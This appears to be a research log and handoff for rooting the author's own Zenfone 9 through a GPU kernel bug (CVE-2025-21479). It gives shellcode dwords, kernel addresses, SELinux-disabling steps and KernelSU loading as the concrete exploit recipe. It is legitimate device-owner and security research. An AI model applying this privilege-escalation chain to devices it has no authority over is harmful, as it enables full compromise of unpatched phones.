# 🗺 ROADMAP — Zenfone 9 root project (durable handoff)

**Project dir: `/home/ben/Dev/zenfone9-root/`** (symlinked at `~/Dev/ClaudeWorkspaces/zenfone9-root`
per the filing-cabinet rule). Everything below is verified on-device unless marked otherwise.

---

## 1. Where we are

**Temporary root: ACHIEVED and verified on 2026-09-17.**

```
before: uid=2000 euid=2000 gid=2000
capset(NULL,NULL) -> 0 errno=0 (Success)
after:  uid=0 euid=0 gid=0  *** ROOT ***
```

Repeatable with one command: `scripts/root-now.sh id` (or `... sh` for a root shell). It patches,
roots, then **always restores the original kernel text** (trap-protected).

Bootloader unlock: **NOT achieved, and not achievable by any conventional route** (ASUS removed the
tool, deleted the Developer-options toggle, and refused `oem unlock` / `flashing unlock` /
`unlock_critical`; the advertised `oem auth-hash` prerequisite is absent on this build).
**Root ≠ unlock**: verified boot is enforced by the bootloader against fused keys, so ROM flashing
still needs ASUS's cooperation. Root gives runtime control, not ROM capability.

---

## 2. The verified chain (four stages)

| # | Stage | Status | Key artifact |
|---|---|---|---|
| 1 | **CVE-2025-21479 trigger** — SDS/RB misclassification lets userland issue `CP_SMMU_TABLE_UPDATE`, hijacking the GPU's TTBR0 | ✅ confirmed (kernel log echoes our TTBR0 in `GPU PAGE FAULT … FAULTING BLOCK: CP`) | `src/cheese.c` |
| 2 | **Deterministic physical-address leak** — `perf_event_paranoid = -1`, so a hardware watchpoint on a page we own returns `PERF_SAMPLE_PHYS_ADDR` = that page's physical address | ✅ page-granular, reproducible | `src/pa_leak.h`, `src/pa_leak.c` |
| 3 | **Arbitrary physical R/W** — fake page table placed at a *known* PA (no spray lottery) | ✅ `READBACK … value=0xc0ffee11 SELFTEST-PASS` ×2 | `src/cheese_pa.c` |
| 4 | **Root** — offline symbol resolution + validated KASLR slide → patch `__do_sys_capset` with `commit_creds(&init_cred)` shellcode → call `capset()` | ✅ uid 0 verified, text restored after | `src/call_capset.c`, `scripts/patch-dwords.sh`, `scripts/root-now.sh` |

Stage 1–3 need no root; stage 4 needs only physical R/W. **Perf leak is the unlock** — upstream and the
iQOO fork both got their spray addresses from readable `pagemap`, which this build denies (PFNs zeroed).

---

## 3. Constants (verified this session — subject to change per boot where noted)

```
kernel physical base        0xA8000000     (arm64 "ARM\x64" magic at +0x38; file offset 0x38 matches)
image_size / file layout    file offset == physical offset - 0xA8000000   (text_offset = 0)
sys_call_table              0xaa129578     (physical; note: index→symbol mapping NOT yet confirmed)
__do_sys_capset             0xa8145af0     (patch target; first dword 0xd503233f = paciasp)
__arm64_sys_capset          0xa8145ac4     (link VA 0xffffffc008145ac4)
init_task                   0xaa79bec0     (task_struct; real_cred +0x778, cred +0x780)
init_cred                   0xaa7b0ae0     (link VA 0xffffffc00a7b0ae0)
commit_creds                0xa8184c94     (link VA 0xffffffc008184c94)
selinux_state               0xaaa40b98     (byte 0 = enforcing: 0x01010001 → 0x01010000 disables)
swapper_pg_dir              0xaa472000     (also found independently by cheese's own scan at +0x2472000)
tramp_pg_dir / idmap_pg_dir 0xaa470000 / 0xaa46d000
KASLR slide                 PER BOOT — last observed 0x2E41000000. Re-derive from init_task.cred
                            high dword (see §5); do NOT hardcode across reboots.
```

Offline resolution: `src/host_kallsyms.c` parses kallsyms from the extracted image; add symbol names
to its list and re-run. `tools/btf_offsets.py` exists but this image has **no BTF** (the `9f eb 01`
hits are instruction bytes) — struct offsets were found by scanning the image instead.

---

## 4. Root procedure (what actually works, and why)

**SELinux must be Permissive first — verified both ways:**
- Permissive → works, and the root process lands in **`u:r:kernel:s0`** (it inherits `init_cred`'s SID,
  i.e. the *kernel* domain — effectively unrestricted, stronger than a typical Magisk root):
  `uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0`
- Enforcing → the process is **silently killed** (`exit=1`, no output): the patched call bypasses the
  SELinux hook, so the process gains uid 0 without a valid domain transition.

⚠️ **Footgun, observed:** leaving the patched text live *while SELinux is permissive* is dangerous — any
process that calls `capset` silently becomes kernel-SID root, and in practice that took the device down
(spontaneous reboot). Always restore the text promptly; a reboot is the failsafe (text is reloaded from
flash, `selinux_state` re-initialised to Enforcing).

One command does the whole cycle (permissive → patch → run as root → restore text + SELinux):
`scripts/root-now.sh id` / `scripts/root-now.sh sh`

**Reliability status — read this before using it.** The *procedure* is verified end-to-end (root was
achieved and confirmed: `uid=0(root) … context=u:r:kernel:s0`, `capset() -> 0`). Re-applying it is
**not yet reliable**, because of the TTBR0-update race and KGSL's fault throttle described in §6: the
13-dword patch has landed completely on some runs (root verified) and only partially on others
(2/13), and a partial patch can panic. Until that is engineered away, treat each attempt as:
verify every dword landed (the script now checks and retries across fresh processes), and **reboot
before retrying** if a run degrades. The single highest-value fix is to reduce the fault rate, e.g. by
gating each write behind a successful probe read of the same page in the same command, or by finding a
single-point root vector (credential-pointer swap) that needs 4 dwords instead of 13.

1. `scripts/patch-dwords.sh write` — writes 13 dwords (52 bytes) of shellcode over `__do_sys_capset`,
   **one dword per process run** via `CHEESE_POKE`. The single-dword path is the one that reliably
   lands; a multi-dword write in one command failed with `EPERM` from KGSL.
2. `call_capset [cmd]` — calls `capset(NULL,NULL)`; the patched handler runs `commit_creds(&init_cred)`,
   so *that process* becomes uid 0; it then `execvp`s the requested command (root shell via `sh`).
3. `scripts/patch-dwords.sh restore` — writes the 13 original dwords back (recorded from the image).

Shellcode layout (13 dwords): `ldr x0, .+8 / b .+12 / <init_cred lo,hi> / ldr x1, .+8 / b .+12 /
<commit_creds lo,hi> / stp x29,x30 / blr x1 / ldp / mov w0,wzr / ret`. The seccomp-clearing stub from
upstream was **omitted on purpose** (adb shell has no seccomp filter; its hardcoded `current->seccomp`
offsets 0x830/0x838 are kernel-specific and could corrupt task_struct here).

Root is per-process and RAM-only: another shell stays uid 2000, and a reboot clears everything.

---

## 5. Deriving the KASLR slide (per boot)

`init_task.cred` (physical `0xaa79c640`) holds a relocated pointer to `init_cred`. Read both dwords
(separate one-read-per-process runs — see the race note below), then:

```
slide = rt_cred - 0xffffffc00a7b0ae0      # must be 2 MB aligned
commit_creds_rt = 0xffffffc008184c94 + slide
```

Cross-check: `init_task.real_cred` (+0x778) must equal `cred`, and the high dword of
`sys_call_table[91]` agreed with the same `0xffffffee` in this boot.

---

## 5b. THE reliability lever: keep the GPU busy (measured)

The SMMU-table update races a **GPU context switch**, so the primitives succeed far more often while the
GPU is actually working. Measured on device with the same 13-dword patch:

| condition | dwords verified |
|---|---|
| GPU idle | **0-2 / 13** |
| GPU busy (`screenrecord --time-limit 900 ... &`) | **11-13 / 13** |

Consequences baked into the tooling:
- `scripts/patch-dwords.sh` starts a synthetic GPU load for **every** mode, including `verify` —
  reads race too, so an idle-GPU "verify" can report garbage and make a good patch look broken.
- The load must cover the whole operation (patch, root call, screenshot, restore), not just the writes.
- A run that cannot complete must be followed by a **reboot**: a partially patched `__do_sys_capset` will
  panic the device the moment anything calls `capset` (observed twice). The scripts auto-restore on
  partial failure, but if the device dies first, reboot is the fix — text is reloaded pristine.

## 5c. Writes currently land ONLY in the self-map page (open issue, measured)

**Update (later session).** The earlier "page-dependent" framing was too narrow. Ground-truth probes
(`CHEESE_WRITE_SELFTEST` / `CHEESE_CMD_SELFTEST`, which write a magic value and verify it through the
CPU where possible, not only through our own GPU readback) show:

| what | command used | destination | result |
|---|---|---|---|
| completion marker | `CP_MEM_WRITE` via **self-map entry** (L3 idx 4) | table page + 0x100 | **lands** (observed `0x7100`, `0x7101`) |
| copy, dst = table page | `CP_MEM_TO_MEM` via target entry (L3 idx 3) | table page + 0x600 | **landed** (CPU-verified `0x33333333`) |
| data write | `CP_MEM_WRITE` via target entry | own user page (PA known via perf leak) | does **not** land (GPU readback still `0xaaaaaaaa`) |
| data write | `CP_MEM_WRITE` via target entry | table page + 0x500 | does **not** land (CPU still sees `0x11111111`) |
| data write | `CP_MEM_WRITE` via target entry | kernel `.bss` (`kptr_restrict` `0xaa78cde8`) | does **not** land |
| data read | `CP_MEM_TO_MEM` via target entry | any of the above pages | **works reliably** |

So, at the moment: **reads work through the target entry; writes only take effect in the physical page
the SMMU is using as its page table.** Verified independent of GPU load, of a fresh boot, of a fresh VA
page (the table's extra entries), and of whether a `MEM_TO_MEM` preamble is emitted first. This is not
yet explained. Candidates still standing: something re-asserts/rewrites those pages; a write path that
only commits for the page-table page; or the SMMU refusing writes for pages outside some allowlist.

Important context: this **used to work**. In the earlier session the same `CP_MEM_WRITE` path wrote 13
dwords into kernel `.text` and root was achieved and verified (`uid=0(root)`, `u:r:kernel:s0`) — so the
capability exists on this hardware and something about device state changed. It also means the earlier
"11-13/13 verified" numbers came from *our own GPU readback*; where a page accepts no writes, that
readback is trustworthy, but it cannot distinguish "write lost" from "write reverted" — hence the
CPU-side verification added later.

Diagnostics that are now cheap and worth running: (a) do a write and *poll* the readback for a few
seconds to separate "never landed" from "landed then reverted"; (b) test a `CP_MEM_TO_MEM` copy from the
staged slot into a **kernel** page (copy, not `CP_MEM_WRITE`) — if copies land where writes do not, root
becomes a copy-based patch; (c) test whether making the target page a KGSL-mapped buffer changes
anything (KGSL's io-pagetable may carry the permissions the SMMU wants).

Consequence: reproducing root is blocked on this, plus the SELinux flip which needs the same write path.

## 5d. What is NOT the cause (tested and eliminated)

- **Not page size/region**: fails for user pages (high bank) and kernel `.bss` alike.
- **Not GPU idleness**: fails under a synthetic GPU load as well as idle. (Load *does* still matter for
  winning the TTBR0 race — see §5b — so keep it for reads and for the cases that do work.)
- **Not the setup-read poisoning the VA page** (SMMU TLB staleness): writing through a *fresh* VA page
  (the table's extra entries, `g_write_va_extra`) behaves identically.
- **Not accumulated GPU fault state**: identical behaviour immediately after a reboot.
- **Not a `CP_MEM_WRITE`-vs-`MEM_TO_MEM` ordering problem**: adding a `MEM_TO_MEM` preamble before the
  write (`g_write_preamble`) does not make the write land.
- **Not the packet encoding**: `cp_gpuaddr` emits `[lo, hi]` and `cp_type7_packet` sets odd parity, so
  `count = 2 + N` is correct (and this exact code path patched kernel text successfully earlier).


## 5e. Round-3 findings: a measurement bug, and a strategy reversal

**Established from the image's embedded config** (decompressed out of `kernel.Image`, `IKCFG_ST` at file
offset `0x1a34220` — an independent analysis pass did this read-only):

- `CONFIG_ARM64_VA_BITS=39` — settles the VA-layout question. Kernel VA space is
  `0xffffffc000000000`–`0xffffffffffffffff`; the `0xffffffee…` runtime pointers are just KASLR placing the
  image high. Nothing in the write/read mechanism depends on this.
- `CONFIG_STATIC_USERMODEHELPER=y` with an **empty** path → in 5.10 `umh.c` every `call_usermodehelper`
  becomes a no-op. **`modprobe_path`, `core_pattern`, `uevent_helper` tricks are dead here.** Don't spend
  time on them.
- `MODULE_SIG` / `MODULE_SIG_FORCE` / `MODULE_FORCE_LOAD` all **not set** → `ksud late-load`'s
  vermagic-rewrite route is unobstructed (relevant to `KERNELSU.md`).
- `CFI_CLANG=y` (non-permissive), no randstruct → struct field order is source order.
- Sections (physical): text `0xa8010000`–`0xa9a30000` | rodata `0xa9a30000`–`0xaa46c000` | init
  `0xaa480000`–`0xaa780000` | data `0xaa780000`–`0xaa988000` | bss `0xaa988000`–`0xaaa7fc1c`.
  So `selinux_state` (`0xaaa40b98`) is in **.bss** (writable, zero-init — *not* rodata), and
  `sys_call_table` (`0xaa129578`) is in **.rodata** (read on every syscall — a worse patch target).
- Enumerating every load/store against the `selinux_state` page found **no store to the `enforcing`
  byte anywhere in the kernel** → the "something re-asserts it" theory is refuted for kernel-side writes.

**The measurement bug (important).** With `CHEESE_NO_RETRY=1`, a KGSL-throttled ioctl means our write
command is *never submitted*, and the harness prints the initial value plus `FAILED` — textually
identical to a store that was submitted and lost. Every "does not land" observation in §5c must be read
with that caveat. Compounding it, `kgsl_gpu_command_payload` returns the raw ioctl return without setting
`errno`, so any `strerror(errno)` in those paths can print a stale message. **Fix before drawing further
conclusions:** report the ioctl return code explicitly, and use the *kernel's own cacheable view* as the
acceptance criterion (e.g. `getenforce`, `getuid`) rather than our GPU readback.

**Cold-page test (run, negative).** A provably cold, symbol-free page in the `__bss_stop.._end` gap
(`0xaaa8f000`, verified zeros, never read or allocated) did **not** accept a store: readback stayed `0x0`
immediately and at t+2 s and t+10 s. So "the target line is dirty/hot" is not sufficient to explain the
failures either — the pending explanation is that the command frequently is not executed at all
(throttle), which the fix above will disambiguate.

**Strategy reversal (this is the unlock).** The dependency we assumed — Permissive SELinux *before* the
patch — is not required, and flipping `selinux_state` from the GPU is the *worst* way to get permissive
(it is a hot, syscall-rate line; and it needs the write path we are debugging). Instead:

1. **Become root first** via the kernel-text patch. `.text` lines are permanently CPU-clean, which is the
   one class of page where a non-cacheable device store is guaranteed to survive.
2. **Then flip SELinux from the rooted process**: it lands in `u:r:kernel:s0` with `CAP_MAC_ADMIN`, so
   `setenforce 0` is an ordinary privileged CPU-side store — no coherency problem at all.
3. This also deletes the dangerous "patched text + permissive" window that rebooted the device twice.

**Reliability lever for step 1:** per the same analysis, TTBR0 does *not* persist across context
switches, so the goal is *fewer race windows*, not more retries. The `CP_MEM_TO_MEM` bulk-copy path
already exists (`g_write_via_copy` + `cheese_stage_dword`) but is currently wired only into self-tests;
promoting it into the write path turns a 13-command patch into a **single** race window.

**Best alternative root primitive (no text patch, no permissive SELinux):** rewrite our own
`struct cred` *contents* — zero `cred+0x04..0x1c` (uid…fsgid; uid is at offset 4 on this config).
Failure is inert (no partial-shellcode panic), `getuid()` is a free kernel-side oracle, and because the
SELinux SID is untouched, enforcing SELinux is fine. Locate the cred by walking `init_task.tasks`
(list_head at ~+0x580 — verify) matching `pid` from `/proc/self/stat`; convert kernel VA→PA using the
delta derived from `init_task.cred` (you already read that pointer): `D = rt_cred_runtime - 0xaa7b0ae0`,
then `PA = VA - D`, cross-validated against ≥3 independent pointers. Sanity check while reading:
eight consecutive `0x000007d0` (=2000) values at `cred+0x04` is the uid block for our shell process.

## 6. Gotchas that cost real time (read before debugging)

- **The primitive is a RACE, and losing it costs you the context.** The drawstate issues
  `CP_SMMU_TABLE_UPDATE` and then the access; if the access executes before the TTBR0 switch takes
  effect it faults (`GPU PAGE FAULT … TTBR0=<our PA>`). KGSL then throttles:
  `gpu fault threshold exceeded 3 faults in 3000 msecs` → **every later command on that context fails
  with EPERM** ("Can't run payload: Unknown error -1"). Consequence: retry loops *inside one process*
  make things worse. Retry across **fresh processes** and pace attempts (>2 s apart).
  Success rate varies: the same 13-dword patch has landed 13/13 (root verified) and 2/13 on other runs.
- **A partially patched function is dangerous.** With only some dwords written, any `capset` caller can
  execute garbage and panic the kernel — observed as a spontaneous reboot. If a patch run degrades,
  reboot to restore text before doing anything else.
- **A readback that equals the value you wrote is only meaningful if that value differs from the old
  one.** Restoring the *original* bytes "verifies" vacuously (readback == original). For the patch
  (where values differ) verification is real.
- **Marker ≠ completion.** `CP_MEM_TO_MEM` (the result copy) can land *after* the `0x41414141` marker
  write. Poll the **result slot** until it differs from the page fill `0x45454545`, then read. Symptom
  of getting this wrong: a low dword reads correctly while the high dword reads `0x45454545`/garbage.
- **Verify the pushed binary's hash.** A stale on-device `cheese_pa` silently produced `rc=0` with zero
  output and sent me chasing a phantom bug. Always compare sha256 after `adb push`.
- **Upstream bug fixed:** `setup_pagetables(..., uint32_t tt0phys, ...)` truncated physical addresses to
  32 bits — invisible upstream (all their addresses < 4 GB), fatal here (DRAM high bank is 0x800000000+).
- **Memory pressure panics this kernel** (`panic_on_rcu_stall=1`, `log_buf_len=256K` so crash trails are
  lost): a 4 GB or 8 GB spray, or addresses inside mapped DRAM, caused reboots. The known-PA port does
  **no** spray and does not crash.
- **Secure/TZ physical memory is fatal to touch** (reading `0x80000038` rebooted the device). Low bank
  is off-limits; normal DRAM is fine.
- **Never leave an injected page-table entry live** — doing so caused a spontaneous reboot. Read before
  writing so you can restore, and reboot after experiments.
- **`SEGV_MAPERR` on the kernel-VA self-map**: the patched `swapper_pg_dir` entry was verified present in
  DRAM, yet the CPU walk saw an invalid entry. Cache/walk-cache visibility, not a wrong table
  (three independent methods agree on `swapper_pg_dir` = `0xaa472000`). Not needed for root as shipped.
- **Reboot recovery:** the device has no PIN: `adb shell 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard'`.

---

## 7. Open paths (unique value each — pick per goal)

1. **Persistence.** Root today is per-process + RAM-only, and the perf leak needs `shell` uid (an app
   likely cannot do it — *unverified*). Options: (a) **tethered re-root on boot** — a host-side service
   that re-applies root when the phone attaches (most realistic); (b) late-load KernelSU-style module
   *while rooted*; (c) verify whether a sandboxed app can reach perf/kgsl at all (SELinux normally denies
   `perf_event` to `untrusted_app`) — this decides whether an app-level root is possible.
2. **Bulk/coherent kernel access.** The self-map would give fast, coherent CPU access to physical memory
   (replacing 4-byte GPU round-trips). Blocked on the walk-visibility question in §6. Unique value:
   large dumps, partition imaging, kernel-module work.
3. **Bootloader / ROM.** Unlock is the only path to custom ROMs (LineageOS 23.2 for AI2202 exists —
   the software is ready). Realistic options: buy a used ZF9 unlocked before the Nov-2023 shutdown;
   watch for ASUS policy reversal; research ABL/EDL (no usable programmer found — the "public" one was
   an HTML page; anti-rollback blocks downgrades and EDL downgrades are documented bricks).
4. **Other unpatched CVEs.** ASUS is EOL, so everything after SPL 2024-07-05 is unpatched — including
   vendor blobs (GPU/DSP/camera/wifi). A public PoC for a *direct* `shell`→uid-0 LPE would skip the whole
   GPU chain. Worth a systematic hunt.
5. **App-reachability audit.** With SELinux permissive, our primitives become reachable from far weaker
   positions. Quantifying "what can an ordinary app do on this build" is both a security answer and a
   root-persistence avenue.
6. **Audio capture (the original goal) — already solved without root:** scrcpy playback capture verified
   (997 Hz tone recovered); on-device equivalent is Android's consent-based AudioPlaybackCapture API.

---

## 8. Layout

```
STATUS.md          running state + receipts
ROADMAP.md         this file (durable handoff)
src/               pa_leak.{c,h} · cheese.c · cheese_pa.c (the workhorse) · call_capset.c
                   host_kallsyms.c (offline symbol resolver) · cheese_scan.c (superseded)
scripts/           root-now.sh · patch-dwords.sh · sweep3.sh (superseded) · verify-backup.sh
tools/             btf_offsets.py (no BTF in this image)
artifacts/         ASUS .145 OTA (SHA-256 verified) · extracted boot/vendor/xbl · kernel.Image
logs/              device logs, screenshots, sweep logs
~/Videos/Zenfone9-backup-NhZOcgfg   media backup (44 files, MD5-verified)
```

**Operating rules:** read before write; restore what you patch; reboot to clear RAM-only state; use the
second Zenfone as the sacrificial unit for anything with panic risk; keep the phone offline.


## Round 8 (verified 2026-09-17): USABLE root + KernelSU early-late-load

Temporary root is now *usable*, and the KernelSU LKM loads. Recipe, in order:

1. **Permissive** — clear BYTE 0 of `selinux_state` (`0xaaa40b98`): the byte IS `enforcing` (byte 1 is
   `checkreqprot`; clearing byte 1 does nothing — that was the first mistake). Hot data does not take a
   device store every time: it needed 5 attempts before `getenforce` flipped to `Permissive`. The oracle
   is the kernel's own `getenforce`, never our readback.
2. **Root** — 16-dword shellcode in place at `__do_sys_capset` (`0xa8145af0`, cold syscall; all
   encodings PC-relative => slide-independent, no runtime literals, no cave):
   `stp x29,x30 / str x19 / bl prepare_creds / cbz / mov x19,x0 / add x0,x19,#4 /
    adrp x1,<init_cred page> / add x1,x1,#0xae4 / mov w2,#0x4c / bl memcpy / mov x0,x19 /
    bl commit_creds / mov w0,wzr / ldr x19 / ldp / ret`
   i.e. copy `init_cred+4 .. +0x50` (all eight ids, securebits, all five cap sets) into a
   `prepare_creds()` copy of OUR cred. `security` sits far beyond +0x50, so **our SELinux SID is kept**.
   Result: `uid=0 euid=0 gid=0`, `CapEff 000001ffffffffff`, `context=u:r:shell:s0`.
   Dwords: `a9be7bfd f9000bf3 9400faa2 b4000140 aa0003f3 91001260 f0013341 912b9021 52800982
   97fb66db aa1303e0 9400fc5e 2a1f03e0 f9400bf3 a8c27bfd d65f03c0`.
3. **Trigger** — any `capset()` call (`/data/local/tmp/call_capset`).

### What that unlocked (measured, same run)

| op as the rooted process | before (Enforcing) | now |
|---|---|---|
| write `/data/local/tmp` | DENIED | **OK** |
| write `/sdcard` (FUSE) | DENIED | **OK** |
| read `/proc/kallsyms` | DENIED | **OK** (`_text` visible; values 0 until `kptr_restrict=0`) |
| list `/data/data` | DENIED | **OK** |
| write proof page | DENIED | **OK** |
| `init_module` | EPERM | **ENOEXEC = permitted** |

### KernelSU

`ksud late-load --kmi android12-5.10 --allow-shell` (tiann v3.3.0, `ksud-aarch64-linux-android`,
`lkm-aarch64-android12-5.10_kernelsu.ko` sha256 `5ca70d239f955139db23cd3028e578975cd038a7f2dc5f54ab4498a13f7ce03a`):

```
kernelsu 200704 0 - Live 0x0000000000000000 (O)
```

The module loads. Still open at the time of writing: ksud's userspace stages (`/data/adb/ksud` came back
`Permission denied`, `ksud.log` empty - likely the permissive flip reverting under vendor services
mid-session), verifying `su`, and installing the manager APK.

### Negative results (do not retry these)

* `commit_creds(&init_cred)` => uid 0 in the **kernel** domain: every userspace op denied.
* `avc_has_perm` text patch: it is **hot**, the patched entry is often never seen => ineffective.
* `avc_denied` (`0xa88ba524`) patch: lands and verifies, changes nothing (it only gates the audit /
  EACCES conversion, not the decision), and the device rebooted soon after.
* `avc_has_perm_noaudit 0xa88bb5d8`; `prepare_creds 0xa8184580`; `memcpy 0xa801f680`;
  `commit_creds 0xa8184c94`; `init_cred 0xaa7b0ae0`; `selinux_state 0xaaa40b98`; cave `0xa801c7e4`
  (7 NOP dwords only - too small for shellcode, fine for the 2-dword `mov w0,wzr; ret` gadget).


## Round 9 (2026-09-17): permissive root fully usable; KernelSU LKM loads but is not yet a stable end state

With the round-8 recipe (permissive byte 0 + 16-dword cred shellcode), **every probe now returns
ALLOWED** as the rooted process — the whole "root that can't do anything" problem is gone:

```
PROBE open /proc/kallsyms                ALLOWED
PROBE write /data/local/tmp              ALLOWED
PROBE write /sdcard (FUSE)               ALLOWED
PROBE open /dev/kgsl-3d0                 ALLOWED
PROBE open /dev/block/by-name/boot_a     ALLOWED
PROBE exec /system/bin/id                ALLOWED
PROBE init_module (bogus image)          rc=-1 errno=8 (Exec format error) => PERMITTED
CapEff: 000001ffffffffff   context=u:r:shell:s0
```
Evidence: `logs/usable-20260917-191347/{root.txt,rootcheck.txt,ksu.txt}`.

Also verified: with root + permissive, `setenforce 0` succeeds through the **kernel's own** selinuxfs
interface (not just our patched byte), i.e. the permissive state becomes official.

### KernelSU v3.3.0 (manager APK installed first, then late-load)

```
kernelsu 200704 0 - Live 0x0000000000000000 (O)      # /proc/modules, reproduced twice
```
The LKM **does load**. What does not yet work:

* `ksud.log` stays empty and `/data/adb` returns EACCES *even as uid 0 with permissive SELinux and
  CAP_DAC_OVERRIDE working elsewhere* (writes to /data/local/tmp and /sdcard succeed in the same
  session, so this is not a capability problem).
* `su` is not found, so KernelSU's own root path is unverified.
* With the module live the system degraded (activity manager unreachable, `cmd: Can't find service:
  package`), and the interrupted restore had to be abandoned; a reboot is the failsafe.

So late-load gets the module in, but ksud's userspace stages (which create `/data/adb/ksud`, busybox,
sepolicy, and the `su` plumbing) must complete before this counts as "KernelSU installed".

### Next steps (in order)

1. Run `ksud late-load` in the *foreground* with stdio captured, from a permissive root session, and
   read its actual error (the empty log is the main unknown).
2. Work out the `/data/adb` EACCES (label/ownership vs. our process) - possibly create it as
   `root:root 0700` with the expected `adb_data_file`/`ksu_file` label *before* loading.
3. Only then verify `su -c id` from an unpatched shell, and take a fresh on-screen proof screenshot
   (this round's `screencap` came back 0 bytes because the system was already degraded by then).
4. Keep the session's permissive flip sticky while ksud runs (vendor services re-assert enforcing).


## Round 10 (2026-09-17): KernelSU late-load VERIFIED WORKING (su -> u:r:ksu:s0)

From a permissive + rooted session, `ksud late-load --kmi android12-5.10 --allow-shell` does the whole
job - it loads the module *and* completes its userspace install:

```
/proc/modules : kernelsu 200704 0 - Live 0x0000000000000000 (O)
/data/adb     : ksud (6286568 B), ksu/bin/                 # created by ksud itself
```

Verified from a **fresh, unpatched adb shell** (uid 2000, no exploit involved, SELinux Enforcing):

```
$ adb shell id
uid=2000(shell) ... context=u:r:shell:s0
$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
kernel log: KernelSU: sys_execve su found
```

That is KernelSU's own root path working with no help from our exploit. Evidence:
`logs/ksu-verified/{ksu-state.txt,ksu-manager*.png,root-proof-*.png}`.

### The key insight that explains round 9

**Late-load re-enables SELinux enforcing** (its documented behaviour). Under Enforcing, the *exploit's*
root - uid 0 but SID still `u:r:shell:s0` - loses `dac_override`, so shell-owned paths
(`/data/local/tmp`, and `/data/adb` by label) come back EACCES despite uid 0 + full caps, while
root-owned `/data/adb` stays reachable. Consequences:

* after late-load, do post-load work through KernelSU's `su` (`u:r:ksu:s0`), not the exploit's uid 0;
* `scripts/root-usable.sh` should re-flip permissive *after* late-load if the exploit is to keep doing
  privileged work;
* round 9's "empty ksud.log + /data/adb EACCES" was this, not a broken module.

### Still open (both cosmetic/verification, not functional)

1. The manager APK's UI stays on its splash screen (even after force-stop + restart, i.e. the
   documented late-load caveat). `su` works regardless.
2. A *fresh* on-screen root proof was not captured this round: `cmd statusbar expand-notifications` is
   ineffective from shell/root here, my swipes opened the app drawer instead, and Chrome cannot read the
   root-written `/sdcard/root-proof.html` (FUSE assigns it `u0_a181 media_rw 0660`). The screen evidence
   captured is the KernelSU app icon/manager. Next attempt should `su -c 'chmod 644 /sdcard/root-proof.html'`
   (or write the page via `su` to a world-readable path) before opening it, and close the app drawer
   (BACK twice) before swiping the shade from y=0.

### Root status: repeatable

Three separate runs of `scripts/root-usable.sh` landed the patch 16/16 verified dwords and produced a
usable uid-0 session; `PHASE=stop` leaves the session live for interactive work
(`adb shell "/data/local/tmp/call_capset sh -c '...'"`), `KEEP=1` keeps it live too. Reboot remains the
failsafe: after reboot the text is pristine, SELinux is Enforcing, and the module is gone (not persistent).
